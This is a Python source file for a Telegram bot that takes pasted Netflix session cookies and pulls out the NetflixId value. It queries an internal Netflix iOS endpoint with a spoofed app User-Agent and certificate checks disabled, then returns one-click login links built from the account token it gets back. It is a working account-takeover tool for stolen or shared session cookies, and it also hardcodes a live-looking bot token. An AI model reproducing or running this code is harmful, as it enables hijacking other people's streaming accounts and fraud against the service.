import re
import requests
import urllib3
import urllib.parse
import telebot
from telebot import types

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BOT_TOKEN = "8636160046:AAHNuuDo0H2bMYdpL86L8ukdM6TGfcmlKM8"
bot = telebot.TeleBot(BOT_TOKEN)

def load_cookies(text):
    cookies = {}

    # Ultra aggressive patterns for your paste
    patterns = [
        r'NetflixId=([^;,\s"]+)',
        r'"NetflixId"[^"]*"value"[^"]*"([^"]+)"',
        r'NetflixId["\s:=]+([^"\s,;]+)',
        r'value":\s*"([^"]+)"[^}]*name":\s*"NetflixId"',
    ]

    for pattern in patterns:
        match = re.search(pattern, text, re.IGNORECASE | re.DOTALL)
        if match:
            cookies["NetflixId"] = match.group(1).strip()
            break

    return cookies

def check_account(cookies):
    if not cookies.get("NetflixId"):
        return None

    try:
        # Generate NFT Token
        headers = {
            "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
            "Cookie": f"NetflixId={cookies['NetflixId']}"
        }
        r = requests.get("https://ios.prod.ftl.netflix.com/iosui/user/15.48", 
                        params={"responseFormat": "json"}, 
                        headers=headers, timeout=15, verify=False)

        if r.status_code == 200:
            data = r.json()
            tok = (((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default", {}).get("token")
            if tok:
                safe = urllib.parse.quote(tok)
                return {
                    "login_pc": f"https://netflix.com/?nftoken={safe}",
                    "login_phone": f"https://netflix.com/unsupported?nftoken={safe}",
                    "login_tv": "https://www.netflix.com/tv2"
                }
    except:
        pass
    return None

@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id, "👋 Paste your Netflix cookie (any format):")

@bot.message_handler(content_types=['text'])
def handle_text(message):
    cookies = load_cookies(message.text)

    if not cookies.get("NetflixId"):
        bot.reply_to(message, "❌ NetflixId not found. Make sure it contains 'NetflixId='")
        return

    bot.send_chat_action(message.chat.id, 'typing')
    result = check_account(cookies)

    if not result:
        bot.reply_to(message, "❌ Could not generate NFT Token.")
        return

    text = "🎬 **NFT Token Login Links**\n"

    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🖥 PC Login", url=result["login_pc"]))
    markup.add(types.InlineKeyboardButton("📱 Phone Login", url=result["login_phone"]))
    markup.add(types.InlineKeyboardButton("📺 TV Login", url=result["login_tv"]))

    bot.send_message(message.chat.id, text, parse_mode="Markdown", reply_markup=markup)

print("Bot Started...")
bot.infinity_polling()
